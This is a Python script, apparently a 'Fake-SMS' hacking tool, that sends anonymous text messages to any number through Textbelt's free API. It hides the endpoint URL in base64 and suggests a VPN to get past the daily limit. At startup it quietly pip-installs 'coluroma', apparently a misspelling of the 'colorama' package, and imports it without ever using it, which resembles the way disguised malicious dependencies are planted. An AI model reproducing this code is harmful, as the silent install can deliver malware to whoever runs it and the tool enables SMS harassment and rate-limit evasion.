from urllib import request
import re
import os
import time
import platform
import base64
print("[*] Checking Requirements Module")
try:
    import requests
except ImportError:
    print("[*]Installing request Module")
    os.system("pip install requests -q -q -q")
try:
    import termcolor
except ImportError:
    print("[*]Installing termcolor Module")
    os.system("pip install termcolor -q -q -q")
    import termcolor
try:
    from coluroma import colors
except:
    os.system("pip install coluroma -q -q -q")
    from coluroma import colors
def logo():
    print(termcolor.colored('''
               _______ _    _  _______     ____  __  __ ______
              / /  ___/ \  | |/ / ____|   / ___||  \/  / ___\ \`
             | || |_ / _ \ | ' /|  _| ____\___ \| |\/| \___ \| |
            < < |  _/ ___ \| . \| |__|_____|__) | |  | |___) |> >
             | ||_|/_/   \_\_|\_\_____|   |____/|_|  |_|____/| |
              \_\                                           /_/
  ''', 'cyan'))

def check_net1():
    print(termcolor.colored("[*] Checking Internet Connection:- ",'cyan'))
    url = "https://www.google.com"
    timeout = 5
    try:
        request = requests.get(url, timeout=timeout)
        print(termcolor.colored("[*] Connected to the Internet",'green'))
        os.system('cls' if os.name == 'nt' else 'clear')
        logo()
        menu()
    except (requests.ConnectionError, requests.Timeout) as exception:
        print(termcolor.colored("[*] No internet connection.",'red'))
def menu():
    ans = True
    while ans:
        print(termcolor.colored("""
      1.Usage
      2.Send SMS
      3.Exit/Quit
      """, 'yellow'))
        ans = input(termcolor.colored("Choose From Given Options: ", 'cyan'))
        if ans == "1":
            print("\033c")
            usage1()
        elif ans == "2":
            print("\033c")
            main_check1()
        elif ans == "3":
            print("\033c")
            logo()
            print(termcolor.colored("\n Thanks For Using Fake-SMS! See You Tomorrow", 'red'))
            ans = None
        else:
            print(termcolor.colored("\n Not Valid Choice Try again", 'red'))
def usage1():
    logo()
    print(termcolor.colored('''
      \n    1. Your Country Code Must Be without +
    2. Country Code Example: 91
    3. Your Phone Number Must be Start Without 0
    4. Full Usage: 913443210111

    ..........NOTE: Only One Text Message Is Allowed Per Day...........

      ''', 'magenta'))
def main_check1():
    logo()
    x = input(termcolor.colored("\n[*] Enter Your Number:- ", 'green'))
    y = input(termcolor.colored("\n[*] Enter Your Message:- ", 'blue'))
    message = base64.b64decode('aHR0cHM6Ly90ZXh0YmVsdC5jb20vdGV4dA=='.encode('ascii')).decode('ascii')
    resp = requests.post(f'{message}', {
        'phone': x,
        'message': y,
        'key': 'textbelt',
    })
    print(termcolor.colored("\n[*] Sending message ", 'yellow'))
    time.sleep(2)
    z = str(resp.json())
    n = 'False'
    if re.search(n, z):
        print(termcolor.colored('\n[ X ] Message not sent! Please Try Again SomeTime Or Use Any Eurpose Based Vpn', 'red'))
    else:
        print(termcolor.colored('\n[ ✔ ] Message sent ', 'green'))
def op():
    try:
        if platform.system().startswith("Windows"):
            os.system("cls")
            logo()
            check_net1()
        elif platform.system().startswith("Linux"):
            print("\033c")
            check_net1()
        else:
            print(termcolor.colored("Please Use Windows Or Linux OS!",'red'))
    except KeyboardInterrupt:
        print(termcolor.colored("\nYou Pressed The Exit Button!",'red'))
        quit()
op()
